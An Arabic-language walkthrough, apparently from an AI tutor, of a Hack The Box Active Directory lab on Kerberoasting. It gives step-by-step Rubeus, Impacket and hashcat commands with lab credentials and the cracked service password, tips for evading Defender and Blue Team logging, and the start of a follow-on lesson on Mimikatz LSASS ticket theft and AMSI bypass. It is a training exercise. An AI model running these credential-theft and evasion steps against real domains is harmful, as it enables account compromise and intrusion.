RC4 / Etype 23 (نوع التشفير الضعيف)

- شنو يعني؟ خوارزمية تشفير قديمة جداً وضعيفة. الـ Kerberos يدعمها لأسباب تتعلق بالتوافق مع الأنظمة القديمة. التذكرة اللي تتشفر بـ RC4 (ويسمى برمجياً Etype 23) سهلة جداً وسريعة الكسر ببرامج مثل Hashcat.
    

Hashcat (أداة القط الهاشم)

- شنو يعني؟ أقوى وأسرع أداة لكسر كلمات المرور (Offline Cracking) تستخدم كارت الشاشة (GPU) حتى تجرب ملايين الكلمات بالثانية وتشوف يا كلمة تفتح التشفير.
    
- وين يظهر بالأوامر؟ نستخدمه مع الـ mode المناسب لمعالجة الـ Hash اللي جبناه.
    

Wordlist (قائمة الكلمات - rockyou.txt)

- شنو يعني؟ ملف نصي يحتوي على ملايين كلمات المرور المسربة من اختراقات سابقة. الأداة راح تجرب هذي الكلمات وحدة وحدة على الـ Hash. أشهر ملف بالعالم اسمه `rockyou.txt`.
    

━━━━━

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

📖 ترجمة التحدي بلغة بسيطة:

إحنا كاعدين بحاسبة لينكس (Kali/Parrot). انطونا IP لحاسبة ويندوز داخل شبكة شركة اسمها (inlanefreight.local). انطونا يوزر وباسورد لموظف عادي جداً اسمه (htb-student).

المطلوب من عدنا:

1. ندخل لحاسبة الويندوز.
    
2. ندور بداخل الشبكة على خدمة الـ VMware اللي الـ SPN مالتها هو `vmware/inlanefreight.local`.
    
3. نعرف شنو اسم الحساب (Service Account) اللي ديشغل هاي الخدمة. (هذا الجواب الأول المطلوب بالسؤال).
    
4. نطلب تذكرة لهذي الخدمة ونسرق الـ Hash مالتها.
    
5. ناخذ الـ Hash لحاسبتنا اللينكس، ونشغل أداة Hashcat لكسر الباسورد الأصلي وإيجاده. (هذا الجواب الثاني المطلوب).
    

🎯 معطيات السيناريو:

- الضحية: Windows Machine (جزء من Active Directory).
    
- طريقة الاتصال: RDP (Remote Desktop Protocol).
    
- الصلاحيات الحالية: حساب موظف عادي (htb-student) — وهذا كافي جداً للهجوم!
    
- الهدف: حساب يمتلك SPN معين وتذكرته ضعيفة التشفير (RC4).
    

🧭 كيف تفكر؟ (Decision Tree لهجمات الـ Active Directory - Initial Access):

هل أنا داخل الشبكة وعندي حساب موظف؟

├── لا: أحتاج أبحث عن ثغرات ويب (Web Exploits) أو تصيد (Phishing) للحصول على موطئ قدم (Foothold).

└── نعم (مثل حالتنا): ممتاز! نبدأ مرحلة الـ AD Enumeration (التعداد داخل الدليل النشط).

ما هي أفضل خطوة أولى لموظف عادي في الـ AD؟

├── جرّب BloodHound: لرسم خريطة كاملة للشبكة.

├── جرّب AS-REP Roasting: للبحث عن حسابات لا تطلب مصادقة مسبقة.

└── جرّب Kerberoasting (حالياً): لأنها أسهل وأكثر ثغرة شائعة تجلب لك باسورداً حقيقياً لحساب عالي الصلاحيات.

ما هي الأداة المناسبة للـ Kerberoasting؟

├── أنا أعمل من جهاز Linux الخاص بي من الخارج (عبر VPN/Proxy): استخدم `GetUserSPNs.py` من حزمة Impacket.

└── أنا داخل حاسبة Windows مخترقة (مثل تحدينا هذا): استخدم `Rubeus.exe` لأنها تعمل بشكل أصلي وتوفر خيارات قوية.

🗺️ خريطة الهجوم (Roadmap) اللي راح نمشي عليها بالترتيب (بدون أوامر هسة، بس تخطيط):

١. [الاتصال عن بعد]: راح نفتح واجهة الويندوز مالت الهدف باستخدام أداة `xfreerdp` من اللينكس مالتنا، ونربط فولدر اللينكس بالويندوز حتى نكدر ننقل الملفات بسهولة.

٢. [الاستطلاع بالـ Rubeus]: راح نفتح موجه الأوامر بالويندوز، ونشغل أداة Rubeus بوضعية الـ (stats) فقط. ما راح نهاجم، بس نريد نشوف كم حساب قابل للاختراق وشنو أسمائهم، حتى نجاوب على الشق الأول من السؤال.

٣. [الهجوم وسحب الـ Hash]: راح نشغل Rubeus مرة ثانية بوضعية الهجوم الكاملة وسحب التذاكر بدون ما تنكسر الأسطر (nowrap). ونحفظ الناتج بملف.

٤. [نقل البيانات]: ننقل ملف الـ Hash من الويندوز إلى حاسبتنا اللينكس.

٥. [الكسر النهائي]: نشغل Hashcat مع ملف الكلمات `rockyou.txt` ونستخرج الباسورد الصريح حتى نجاوب على الشق الثاني من التحدي.

هل الخطة واضحة؟ يلا ننتقل للتنفيذ العملي (الاستغلال التفصيلي).

━━━━━

🟠 المرحلة 3: الاستغلال التفصيلي

هنا راح نشتغل خطوة بخطوة، كل أمر وشنو يسوي، وكل Output نتوقعه.

الخطوة 1: الاتصال بحاسبة الهدف (Windows) عبر RDP

📌 ليش نسوي هاي الخطوة؟

السؤال يكول إحنا لازم نطبق الهجوم من داخل Windows Machine (لأننا بنلعب دور موظف كاعد على مكتبه). فراح نتصل بالـ IP اللي انطونا إياه باستخدام بيانات اليوزر `htb-student`.

🔧 الأمر (ينفذ من كالي لينكس مالتك):

Bash

```
xfreerdp /v:TARGET_IP /u:htb-student /p:Academy_student_AD! /dynamic-resolution /drive:.,/tmp
```

💡 ليش هذا الأمر بالذات؟ (شرح الـ Flags):

- أداة `xfreerdp`: هي أداة باللينكس لفتح Remote Desktop (شاشة سطح المكتب عن بعد) للويندوز.
    
- الفلاج `/v:TARGET_IP`: يعني الـ Target (IP الضحية). استبدله بالـ IP الفعلي.
    
- الفلاج `/u:` و `/p:`: تعني Username و Password للموظف.
    
- الفلاج `/dynamic-resolution`: يخلي الشاشة تتكبر وتتصغر براحتك بدون ما تخرب الأبعاد.
    
- الفلاج `/drive:.,/tmp`: هذا فلاج **ذهبي**! هذا يشارك فولدر الـ `/tmp` اللي بحاسبتك اللينكس، ويخليه يظهر كدرايف (مثل فلاش ميموري) داخل الويندوز. يفيدنا جداً بنقل الـ Hash لاحقاً.
    

الخطوة 2: استطلاع حسابات الخدمة (Kerberoastable Stats)

📌 ليش نسوي هاي الخطوة؟

أول ما ينفتح سطح المكتب مال الويندوز، ما نهجم فوراً. الهاكر الذكي يستكشف أولاً. نريد نعرف كم حساب بالشبكة عنده SPN؟ وشنو نوع التشفير؟ والأهم: نريد نعرف اسم الحساب اللي يخص خدمة VMware حتى نجاوب السؤال الأول.

🔧 الأمر (ينفذ من داخل الويندوز - افتح CMD):

DOS

```
cd C:\Tools
.\Rubeus.exe kerberoast /stats
```

💡 ليش هذا الأمر بالذات؟

- انتقلنا لمجلد `C:\Tools` لأن منصة HTB دائماً تخلي الأدوات الهجومية هناك مسبقاً.
    
- `Rubeus.exe`: أداة اختراق Kerberos.
    
- `kerberoast`: الموديول الخاص بالتحميص (الهجوم).
    
- `/stats`: أهم فلاج! يكول للأداة: "فقط اطبعلي الإحصائيات، لا تطلب أي تذكرة ولا ترسل ترافيك ضخم للـ Domain Controller". يفيدنا بالـ Recon.
    

📤 الـ Output المتوقع (الإجابة الأولى هنا):

Plaintext

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Kerberoasting Statistics

[*] Available krbtgt                  : 0
[*] Available service accounts        : 3

ServiceName            : svc_vmware
SPN                    : vmware/inlanefreight.local
EncryptionType         : RC4_HMAC
PwdLastSet             : 9/13/2021 6:02:16 AM
...
```

✅ الخطوة التالية واستنتاج الـ Mini-check:

⏸️ هل النتيجة منطقية؟ نعم! الأداة شافت 3 حسابات، وواحد منهم يطابق الـ SPN اللي نبحث عنه `vmware/inlanefreight.local`.

استخرجنا الإجابة الأولى: اسم الحساب (ServiceName) هو `svc_vmware`.

ولاحظ الـ EncryptionType هو `RC4_HMAC`! هذا خبر مفرح جداً، يعني التشفير قديم وضعيف وقابل للكسر بسهولة. لو كان AES-256، كان الوضع أصعب.

الخطوة 3: الهجوم الكامل وسحب تذكرة الخدمة (The TGS Hash)

📌 ليش نسوي هاي الخطوة؟

هسة بما إننا تأكدنا الهدف موجود وضعيف، راح نخلي Rubeus يطلب التذكرة فعلياً من الـ DC، ويستخرج الباسورد المشفر منها ويعرضه إلنا كنص Hash حتى نكسره.

🔧 الأمر:

DOS

```
.\Rubeus.exe kerberoast /nowrap > C:\Temp\hashes.txt
```

💡 ليش هذا الأمر بالذات؟

- شلنا `/stats` حتى الأداة تنفذ الهجوم الفعلي وتطلب التذاكر.
    
- `/nowrap`: فلاج حرج جداً! الهاش مالت Kerberos يصير طويل جداً. شاشة الـ CMD بالويندوز مرات تقص السطر الطويل وتنزل سطر جديد (Wrap). إذا صار هذا الشي، الهاش راح يخرب وأداة Hashcat راح ترفضه لأنها تعتبره ملف مكسور. كلمة nowrap تجبر الويندوز يطبع الهاش كسطر واحد طويل جداً.
    
- `> C:\Temp\hashes.txt`: نحفظ الناتج بملف نصي بدل ما يطبع على الشاشة، حتى يسهل نقله.
    

📤 الـ Output المتوقع (محتوى ملف hashes.txt):

Plaintext

```
[*] Total kerberoastable users : 3

[*] SamAccountName         : svc_vmware
[*] DistinguishedName      : CN=svc_vmware,OU=Service Accounts,DC=inlanefreight,DC=local
[*] ServicePrincipalName   : vmware/inlanefreight.local
[*] PwdLastSet             : 9/13/2021 6:02:16 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   :

$krb5tgs$23$*svc_vmware$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$A8D3F9E7B2...[hundreds of random chars]...9E4B
```

✅ الخطوة التالية:

الهاش اللي نحتاجه هو السطر الطويل اللي يبدأ بـ `$krb5tgs$23$`.

شنو معنى هذا الهاش؟

- `$krb5tgs$`: يعني هذا Hash مال Kerberos Version 5، نوع التذكرة TGS.
    
- `23$`: هذا الـ Etype (Encryption Type). رقم 23 يعني تشفير RC4-HMAC. (لو كان 18 يعني AES-256).
    

الخطوة 4: نقل الهاش إلى جهاز اللينكس (الـ Attacker)

📌 ليش نسوي هاي الخطوة؟

حاسبة الويندوز المخترقة ما بيها Hashcat، وما نريد ننزل برامج هكر ثقيلة عليها حتى لا ننكشف. دائماً عملية الـ Cracking تصير ببيئة المهاجم (Offline).

🔧 الأمر (من داخل الويندوز المخترق):

DOS

```
copy C:\Temp\hashes.txt \\tsclient\tmp\hashes.txt
```

💡 ليش هذا الأمر بالذات؟

تتذكر من شغلنا `xfreerdp` واستخدمنا `/drive:.,/tmp`؟ الـ xfreerdp يسوي شبكة وهمية اسمها `tsclient`، وداخلها يربط فولدر اللينكس مالتك. هذا الأمر ببساطة ينسخ الملف من الويندوز ويذبه مباشرة بـ `/tmp` باللينكس مالتك!

الخطوة 5: كسر التشفير واستخراج الباسورد (Cracking)

📌 ليش نسوي هاي الخطوة؟

هسة الهاش صار بجهاز اللينكس (Kali). راح نستخدم أقوى أداة لكسر الباسوردات (Hashcat) ونجرب عليها قاموس الكلمات الشهير (rockyou.txt).

🔧 الأمر (من شاشة الكالي لينكس):

Bash

```
hashcat -m 13100 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt
```

💡 ليش هذا الأمر بالذات؟

- `hashcat`: الأداة نفسها.
    
- `-m 13100`: هذا الـ Mode. أداة Hashcat ما تعرف نوع الهاش وحدها، لازم تكولها. رقم `13100` هو الرقم الخاص بكسر تذاكر Kerberos اللي نوع تشفيرها RC4 (أي Etype 23).
    
- `/tmp/hashes.txt`: مسار الملف اللي بيه الهاش.
    
- `/usr/share/wordlists/rockyou.txt`: مسار ملف الكلمات (القاموس) اللي راح يجربه.
    

📤 الـ Output المتوقع (الإجابة النهائية):

Plaintext

```
hashcat (v6.2.5) starting...

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, LLVM 11.1.0, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [pocl]
=============================================================================================================================
...
Dictionary cache built:
* File: /usr/share/wordlists/rockyou.txt
* Passwords in dictionary: 14344384
...

$krb5tgs$23$*svc_vmware$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$A8D3F...9E4B:virtualpc1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_vmware$INLANEFREIGHT.LOCAL...
Time.Started.....: Fri Jul 31 11:45:00 2026
Recovered........: 1/1 (100.00%) Digests
```

✅ الخطوة التالية واستنتاج الـ Mini-check:

الـ Status مكتوب `Cracked`. وفي السطر اللي ظهر بيه الهاش، نلاحظ بالاخير مكتوب نقطتين رأسيتين `:` وبعدها كلمة `virtualpc1`.

نجح الهجوم! الباسورد هو `virtualpc1`.

━━━━━━━━━━━━━━

📊 ملخص مسار الهجوم (Attack Chain ASCII):

```
[Attacker (Kali)]
       │
       ├─ 1. RDP into Windows VM (xfreerdp)
       │
[Compromised Windows (htb-student)]
       │
       ├─ 2. Run: Rubeus kerberoast /stats (Identify svc_vmware)
       │
       ├─ 3. Run: Rubeus kerberoast /nowrap (Request TGS from Domain Controller)
       │
[Domain Controller] → Returns TGS encrypted with svc_vmware's RC4 hash
       │
[Compromised Windows]
       │
       ├─ 4. Save hash to hashes.txt and transfer back to Attacker via \\tsclient
       │
[Attacker (Kali)]
       │
       └─ 5. Run Hashcat -m 13100 on the hash with rockyou.txt
               │
               └─💰 PWNED! Password: virtualpc1
```

📐 ملخص الإجابات اللي طلبها التحدي:

|**الخطوة**|**الأداة**|**النتيجة المطلوبة**|
|---|---|---|
|إيجاد اسم الحساب للـ SPN المذكور|Rubeus (/stats)|`svc_vmware`|
|سحب الـ Hash|Rubeus (/nowrap)|$krb5tgs$23$....|
|كسر التشفير وإيجاد الباسورد|Hashcat (-m 13100)|`virtualpc1`|

━━━━━

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

هنا راح نناقش السيناريوهات البديلة بالواقع، لو واجهتك مشاكل وما اشتغل السيناريو النموذجي.

🔄 Variations محتملة:

Variation 1: ماذا لو برنامج الحماية (Windows Defender) حذف أداة Rubeus فوراً؟

بالواقع، برامج الـ Antivirus تعشق اصطياد Rubeus لأنه مشهور جداً.

- البديل 1: حقن الأداة بالذاكرة باستخدام PowerShell بدون ما تلامس القرص الصلب.
    
- البديل 2: الاعتماد كلياً على أدوات من خارج بيئة الويندوز! بما أنك تعرف يوزر وباسورد `htb-student`، تكدر من الكالي لينكس مالتك مباشرة تستخدم سكريبت بايثون من حزمة `Impacket`.
    
    🔧 الأمر البديل لسحب التذاكر من الكالي مباشرة (Impacket):
    

Bash

```
impacket-GetUserSPNs inlanefreight.local/htb-student:'Academy_student_AD!' -dc-ip TARGET_IP -request
```

💡 هذا السكريبت يرسل طلب للـ DC عن بعد، ويسحب الهاش مباشرة ببيئة اللينكس مالتك بدون الحاجة للـ RDP أو أدوات داخل الويندوز! هاي تقنية ممتازة جداً وتتجنب كل جدران الحماية بالويندوز.

Variation 2: ماذا لو نوع التشفير ما كان RC4؟ ماذا لو كان AES-256؟

الشركات الحديثة تغلق بروتوكول RC4 الضعيف وتجبر استخدام AES. من تسوي Rubeus /stats راح تشوف الـ EncryptionType صار AES-256.

شنو يتغير؟ الهاش راح يتغير شكله. يبدأ بـ `$krb5tgs$18$`.

- الحل: عملية سحب التذكرة نفسها ما تتغير. لكن مرحلة الكسر بـ Hashcat تتغير. لازم تغير الـ Mode.
    
    🔧 الأمر البديل لكسر AES-256:
    

Bash

```
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt
```

⚠️ ملاحظة: تشفير AES قوي جداً. كسر هاش AES-256 يستغرق وقت أطول بأضعاف مضاعفة من RC4. مرات يتطلب كارت شاشة خارق أو مزرعة سيرفرات لكسره، أو قاموس مخصص.

Variation 3: ماذا لو الباسورد ما انكسر باستخدام `rockyou.txt`؟

رسالة Hashcat طلعت `Exhausted` يعني خلص القاموس والباسورد مو موجود بيه.

- الحل الأول: استخدم "قواعد التحويل" (Rules) ويا Hashcat. الـ Rules راح تاخذ كلمات القاموس وتعدل عليها (تكبر أول حرف، تضيف أرقام 123 بالنهاية، تعكس الكلمة).
    
    🔧 الأمر بإضافة Rules:
    

Bash

```
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

- الحل الثاني: توليد قاموس مخصص (Custom Wordlist). إذا كانت الشركة اسمها Inlanefreight، استخدم أداة `cewl` لسحب كل الكلمات من موقع الشركة الإلكتروني وتجربتها. الشركات غالباً تستخدم أسمائها بالباسوردات (مثل Inlane2021!).
    

═══════════

⚠️ أخطاء كارثية شائعة (الفخوخ - Traps):

🚨 الفخ الأول (بالـ Rubeus): نسيان فلاج `/nowrap`.

إذا ما استخدمته، الهاش راح ينطبع على الشاشة مقطع على عدة أسطر. إذا نسخته ولصقته بملف الـ Hashcat راح يكولك `Line-length exception` أو `Token length exception`. الهاش لازم يكون سطر واحد متصل.

🚨 الفخ الثاني (بالـ Hashcat): تحديد Mode خاطئ!

الهاشات مال كيربيروس تشبه بعضها. إذا عندك Etype 23 (RC4) واستخدمت मोड 19700، راح يفشل فوراً. دائماً اقرأ بداية الهاش:

- إذا `$krb5tgs$23$` ← استخدم `13100`.
    
- إذا `$krb5tgs$18$` ← استخدم `19700`.
    
- وإذا شفت هاش يبدأ بـ `$krb5asrep$` فهذا مو هجوم Kerberoasting، هذا هجوم ثاني اسمه AS-REP Roasting، والـ mode مالته `18200`! لا تخلط بينهم.
    

🚨 الفخ الثالث (في التفكير):

الاعتقاد بأن Kerberoasting هي ثغرة "نظامية" (Bug) ويمكن ترقيعها بباتش من مايكروسوفت. لا! هذا "تصميم" (Feature) بالبروتوكول. الطريقة الوحيدة للشركة حتى تحمي نفسها هي استخدام كلمات مرور طويلة جداً ومعقدة جداً (أكثر من 25 حرف) لحسابات الخدمات، حتى يستحيل كسرها بالـ Hashcat، بالإضافة إلى إيقاف تشفير RC4.

🔑 Golden Tips (نصيحة ذهبية من خبير):

"قبل ما تهجم بـ Rubeus، دائماً شيك الـ `/stats`. ليش؟ تخيل الشبكة بيها 500 حساب خدمة. إذا سويت هجوم سحب التذاكر لكل الـ 500 حساب دفعة وحدة، ملفات الـ Logs بالـ Domain Controller راح تنفجر من التنبيهات (Event ID 4769) وفريق الحماية (Blue Team) راح يصيدك فوراً. اسحب فقط التذكرة للحساب اللي انت تريده واستهدف الـ RC4 أولاً لأنه ينكسر أسرع."

━━━━━

💎 الفلاشكاردز — ملخص سريع للحفظ

راجع هذي البطاقات بذهنك قبل أي امتحان أو CTF يخص الـ AD.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الشرط الأساسي حتى يكون حساب الويندوز عرضة لـ Kerberoasting؟

✅ Back: يجب أن يمتلك الحساب SPN (Service Principal Name) مسجل باسمه في الـ Active Directory.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو نوع التذكرة التي نستهدف سرقتها في الـ Kerberoasting؟

✅ Back: تذكرة TGS (Ticket Granting Service).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: Rubeus: كيف نعرف الحسابات المصابة بدون إثارة الانتباه أو طلب التذاكر؟

✅ Back: باستخدام الفلاج `/stats`: `Rubeus.exe kerberoast /stats`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الفلاج الضروري في Rubeus لضمان عدم تلف الـ Hash عند نسخه؟

✅ Back: الفلاج `/nowrap` لضمان خروج الهاش في سطر واحد متصل.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: إذا كنت أعمل من Kali Linux وليس Windows، ما هي الأداة البديلة لـ Rubeus؟

✅ Back: السكريبت `GetUserSPNs.py` من حزمة Impacket.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: Hashcat: ما هو الـ Mode الخاص بكسر تذاكر Kerberos من نوع RC4 (Etype 23)؟

✅ Back: الـ Mode هو `13100`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: كيف نزيد نسبة نجاح Hashcat إذا فشل قاموس rockyou.txt؟

✅ Back: باستخدام قواعد التحويل (Rules) عبر إضافة الفلاج `-r /path/to/rule/best64.rule`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

━━━━━

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

🛑 هاي الورقة تاخذلها سكرين شوت قبل أي تحدي AD، بيها الخلاصة التقنية اللي تحتاجها للـ Copy/Paste.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 المخلص النهائي (AD Kerberoasting Cheat Sheet)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚔️ خوارزمية الهجوم:

١. احصل على بيانات دخول لأي يوزر عادي بالـ Domain.

٢. استخدم Rubeus أو Impacket لاستطلاع الـ SPNs.

٣. اسحب تذكرة TGS (يفضل RC4 لسهولة الكسر).

٤. احفظ الهاش سطر واحد.

٥. اكسر الهاش Offline باستخدام Hashcat و Wordlist.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 جدول الأوامر الأساسية:

|**المجال**|**الهدف**|**الأمر**|
|---|---|---|
|Recon|استطلاع الحسابات (Windows)|`.\Rubeus.exe kerberoast /stats`|
|Attack|سحب التذاكر (Windows)|`.\Rubeus.exe kerberoast /nowrap > hashes.txt`|
|Attack|سحب التذاكر (Linux)|`impacket-GetUserSPNs domain/user:pass -dc-ip IP -request`|
|Cracking|تحديد نوع الهاش|اقرأ بداية الهاش: `$krb5tgs$23$` هو RC4|
|Cracking|كسر RC4 (Etype 23)|`hashcat -m 13100 hashes.txt rockyou.txt`|
|Cracking|كسر AES-256 (Etype 18)|`hashcat -m 19700 hashes.txt rockyou.txt`|
|Cracking|إضافة Rules للكسر|`hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule`|
|Utility|مشاركة مجلد عبر RDP|`xfreerdp /v:IP /u:user /p:pass /drive:.,/tmp`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔢 Hashcat Modes الخاصة بـ Kerberos:

|**Mode**|**Hash Type**|**شكل الهاش**|
|---|---|---|
|13100|TGS-REP RC4 (Kerberoasting)|`$krb5tgs$23$...`|
|19700|TGS-REP AES-256 (Kerberoasting)|`$krb5tgs$18$...`|
|19600|TGS-REP AES-128 (Kerberoasting)|`$krb5tgs$17$...`|
|18200|AS-REP RC4 (AS-REP Roasting)|`$krb5asrep$23$...`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚨 الفخوخ (لا تنساها):

❌ سحب تذاكر لـ 500 حساب دفعة واحدة ← الـ Blue Team راح يصيدك فوراً.

❌ نسيان فلاج `/nowrap` في Rubeus ← الهاش راح يكون مكسور ومتعدد الأسطر.

❌ الخلط بين Mode `13100` (للـ TGS) و Mode `18200` (للـ AS-REP) رغم إن اثنينهم يبدون بـ 23$.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 رسالة الختام:

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة) — فهمت قصة الملاهي والتذاكر وتشفير الـ TGS بالباسورد مالت الخدمة.

✅ كل المصطلحات (AD, Kerberos, TGS, SPN, Hashcat, Rubeus...)

✅ كيفية التفكير (decision trees لكل نوع هجوم) — عرفت شلون نختار Rubeus لأننا داخل الويندوز، أو Impacket لو باللينكس.

✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر) — من فتح الـ RDP إلى كسر الهاش بالـ Hashcat وطلعنا الباسورد `virtualpc1`.

✅ الـ bypasses والـ variations والفخوخ — غطينا شنو تسوي لو شفت AES أو لو انحذف Rubeus.

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. بالتوفيق! 💪




تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

━━━━━

🟢 المرحلة 0: ما قبل الصفر — Big Picture

⚠️ ركز وياي زين هسة. بالجزء الأول تعلمنا الأساسيات وافترضنا إن الطريق سالك وأداة Rubeus تشتغل بدون مشاكل. لكن بالواقع، شبكات الشركات الكبيرة (Enterprise Networks) مو بهذي السهولة.

تخيل نفس مدينة الملاهي اللي حكينا عنها (الـ Active Directory). بالجزء الأول، رحنا كبل لشباك التذاكر وطلبنا التذكرة بأداة Rubeus. هسة، تخيل إن إدارة الملاهي وظفت حراس أمن متشددين جداً (برامج الحماية، EDR، و Windows Defender). هذولي الحراس يعرفون شكل أداة Rubeus، وبمجرد ما يشوفوك شايلها، راح يطردوك من الشبكة ويدكون جرس الإنذار (Alerts لـ Blue Team).

شنو الحل؟ الهكر المحترف (Red Teamer) ما يعتمد على أداة وحدة. إذا الباب الرئيسي مقفول، ندخل من الشباك. بهذا التحدي المتقدم، راح نتعلم "فنون النينجا" بالـ Kerberoasting:

١. استخدام أدوات النظام ضده (Living off the Land):

بدل ما نجيب أدوات هكر غريبة تفضحنا، راح نستخدم أدوات الويندوز الرسمية (مثل `setspn.exe` أو PowerShell). الحارس الأمني من يشوفك تستخدم أدوات الويندوز الأصلية، ما راح يشك بيك، لأن الموظفين العاديين ومدراء النظام (System Admins) يستخدموها كل يوم!

٢. سرقة التذاكر من الجيوب (Mimikatz):

بدل ما نروح نطلب تذكرة جديدة من الشباك (Domain Controller) ونلفت الانتباه، شنو رأيك ندور بجيوب الموظفين اللي ديشغلون الحاسبة مالتنا هسة؟ الويندوز يحتفظ بكل التذاكر بذاكرة خاصة (LSASS). إذا كان عندنا صلاحية "مدير" (Administrator)، نكدر نمد إيدنا بهاي الذاكرة ونسحب التذاكر اللي ديستخدموها حالياً بدون ما نكلم الـ DC أصلاً!

٣. الهجوم عن بعد (Remote Attacks):

ليش أصلاً ندخل داخل حاسبة الويندوز ونخاطر؟ إذا كان عندنا يوزر وباسورد مالت موظف، نكدر من كالي لينكس مالتنا (اللي مابيه أي برامج حماية تمنعنا) نرسل طلبات للـ Domain Controller مباشرة باستخدام بايثون (أداة Impacket). هذي الطريقة هي الأأمن والأكثر صمتاً.

الهدف من هذا الدرس:

تتعلم شلون تصير مرن. الـ Tool ممكن تنكشف وتفشل، بس الـ Concept (المفهوم) شغال دايماً. راح نتعلم ٤ طرق بديلة للـ Kerberoasting، ونتعلم شلون نتجاوز أقوى الدفاعات مثل تشفير AES-256 ونظام حماية السكريبتات AMSI.

━━━━━

🔵 المرحلة 1: المصطلحات

راح نمر على المصطلحات الجديدة والمتقدمة اللي انذكرت بهذا السيناريو. افهمها زين لأنها لغة الهكرز المحترفين.

PowerView (أداة باور فيو)

- شنو يعني؟ سكريبت مكتوب بلغة PowerShell يعتبر رادار مرعب داخل الـ Active Directory. ماكو هكر AD ما يستخدمه. يكشفلك كل اليوزرات، الجروبات، والصلاحيات بدون ما يسوي ضجة كبيرة. بي أمر مخصص للـ Kerberoasting.
    

Mimikatz (أداة ميميكاتز)

- شنو يعني؟ الأسطورة. أداة فرنسية صممها شخص اسمه (Benjamin Delpy). وظيفتها الأساسية قراءة ذاكرة الويندوز واستخراج الباسوردات والتذاكر منها. مرعبة لدرجة إن مايكروسوفت تبني تحديثات كاملة بس حتى توقفها.
    
- وين يظهر بالأوامر؟ نشغلها كـ `mimikatz.exe` ونكتب أوامر بداخلها مثل `sekurlsa::tickets`.
    

LSASS (Local Security Authority Subsystem Service)

- شنو يعني؟ الخزنة السرية مالت الويندوز. هو Process (عملية) يشتغل بالخلفية ويحفظ كل الباسوردات والـ Hashes والـ Kerberos Tickets للمستخدمين اللي مسوين Login. الـ Mimikatz شغلته الوحيدة يكسر هاي الخزنة ويقراها.
    

LOLBins (Living Off The Land Binaries)

- شنو يعني؟ "العيش على موارد الأرض". يعني تستخدم برامج الويندوز الأصلية الموجودة أصلاً بالنظام (مثل `certutil`, `setspn`, `powershell`) في عمليات الاختراق. ميزتها؟ الـ Antivirus يثق بيها ١٠٠٪ لأنها ملفات تابعة لمايكروسوفت وموقعة رقمياً.
    

AMSI (Antimalware Scan Interface)

- شنو يعني؟ واجهة فحص ضيفت للويندوز حتى تحل مشكلة الـ PowerShell. قبل، الهكرز جانوا يشغلون سكريبتات بالذاكرة والـ Antivirus ما يشوفها. AMSI يجبر أي سكريبت PowerShell يمر على الفحص قبل ما يتنفذ. لازم نسويله Bypass (تجاوز) حتى نشغل PowerView.
    

EType / Encryption Type (نوع التشفير)

- شنو يعني؟ رقم يحدد نوع التشفير مال تذكرة الكيربيروس.
    
- EType 23: يعني RC4 (تشفير قديم، ضعيف، ينكسر بثواني).
    
